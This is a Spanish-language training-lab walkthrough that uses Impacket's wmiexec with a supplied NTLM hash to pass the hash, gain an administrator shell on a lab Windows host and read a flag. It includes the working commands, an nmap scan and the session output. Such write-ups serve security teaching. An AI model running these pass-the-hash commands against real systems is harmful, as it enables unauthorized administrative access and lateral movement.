
# Pass the Hash con WMIExec

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Pass The Hash - WMIExec**</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servicio WMI vulnerable. Puede acceder a la máquina objetivo en **demo.ine.local**.

Tu tarea consiste en identificar el servicio WMI mediante las herramientas disponibles en Kali y, a continuación, utilizar la herramienta WMIExec para realizar una post-explotación en dicho servicio. WMIExec emplea un enfoque similar al de SMBExec, pero ejecuta comandos a través de WMI. Además, genera menos registros de eventos.

El siguiente hash NTLM puede utilizarse para acceder al servicio:

```
- User: Administrator
- Hash: 5c4d59391f656d5958dab124ffeabc20
```

**Objetivo**: ¡Explotar la máquina objetivo utilizando el hash NTLM proporcionado y recuperar la flag!

{% hint style="info" %}
**IMPORTANTE**: Para que funcione debemos poner la misma cantidad de ceros que el hash NTLM, concretamente 32 ceros en el siguiente formato:
{% endhint %}

<pre><code><strong>00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20
</strong></code></pre>

### Hosts

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.6        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.37.6      attackdefense.com attackdefense
10.2.31.141    demo.ine.local
```

### Escaneo de puertos

Tenemos SMB abierto:

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Impacket WMIExec

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-wmiexec -hashes 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20 administrator@10.2.31.141

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
attackdefense\administrator

C:\>pwd
'pwd' is not recognized as an internal or external command,
operable program or batch file.

C:\>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
```

Vemos que no podemos ejecutar comandos en esta shell semi interactiva, por lo que debemos añadir lo siguiente para tener una Powershell interactiva:

```
-shell-type powershell
```

### WMIExec: Powershell Interactiva

```bash
┌──(root㉿attackdefense)-[~]
└─# impacket-wmiexec -hashes 00000000000000000000000000000000:5c4d59391f656d5958dab124ffeabc20 administrator@10.2.31.141 -shell-type powershell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
PS C:\> pwd

Path
----
C:\
```

### Acceso a la flag

```powershell
PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       11/14/2018   6:56 AM                EFI                                                                   
d-----        5/13/2020   5:58 PM                PerfLogs                                                              
d-r---        11/7/2020   7:47 AM                Program Files                                                         
d-----        11/7/2020   7:47 AM                Program Files (x86)                                                   
d-r---        11/7/2020   8:15 AM                Users                                                                 
d-----        11/7/2020   7:49 AM                Utilities                                                             
d-----        4/13/2026   5:29 PM                Windows                                                               
-a----         6/2/2021  10:19 AM             37 flag.txt                                                              


PS C:\> cat flag.txt
oiu21432123avvcde1vsdfxxr323p********
```
